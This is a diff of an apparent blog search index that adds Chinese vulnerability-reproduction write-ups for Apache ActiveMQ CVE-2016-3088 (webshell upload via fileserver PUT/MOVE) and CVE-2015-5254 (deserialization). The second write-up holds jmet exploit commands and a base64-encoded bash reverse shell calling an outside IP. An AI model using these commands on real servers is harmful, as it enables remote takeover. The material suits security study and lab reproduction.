@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析]]></title>
+    <url>%2F2019%2F06%2F13%2FApache%20ActiveMQ%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2016-3088)%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[1.漏洞背景：ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。 2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程***者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。8161端口为web控制台端口，本漏洞就出现在web控制台中。ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高而且文件操作容易出现漏洞。所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。 2.漏洞利用：首先 PUT 一个 Jsp 的 Webshell 到 fileserver 目录下面添加的是生成一个jsp的***（msfvenom生成的payload）然后利用 MOVE 方法将 Webshell 移入 admin/ 目录（也可以利用相对路径）这时访问http://你的ip:8161/api/发现你的木马已经存在了。然后用kali监听，网站上执行，就能获得root权限。]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[ActiveMQ反序列化漏洞(CVE-2015-5254)]]></title>
     <url>%2F2019%2F06%2F13%2FActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2015-5254)%2F</url>
     <content type="text"><![CDATA[1.漏洞介绍：Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程***者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。 2.漏洞利用过程如下：①构造可执行命令的序列化对象②作为一个消息，发送到目标61616端口③访问web管理页面，读取信息，触发漏洞 3.漏洞复现：①.首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jarmkdir external②.执行命令java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME 靶机的ip 61616③.它会给你的ID，访问http://你的ip：8161:8161/admin/queues.jsp④.利用方式也很简单，我们只要将命令换成反弹shell语句再利用就行了。不过在这里我们需要一些小技巧来绕过Java的机制。bash -i &gt;&amp; /dev/tcp/靶机IP/8888 0&gt;&amp;1 bese64编码把编码放进去。bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}⑤.然后我们是使用同样的命令将payload发送到61616端口。java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}” -Yp ROME 靶机ip 61616⑥.然后我们查看这条消息，触发命令执行，这时我们在靶机上监听端口，即可得到shell。⑦.成功。]]></content>
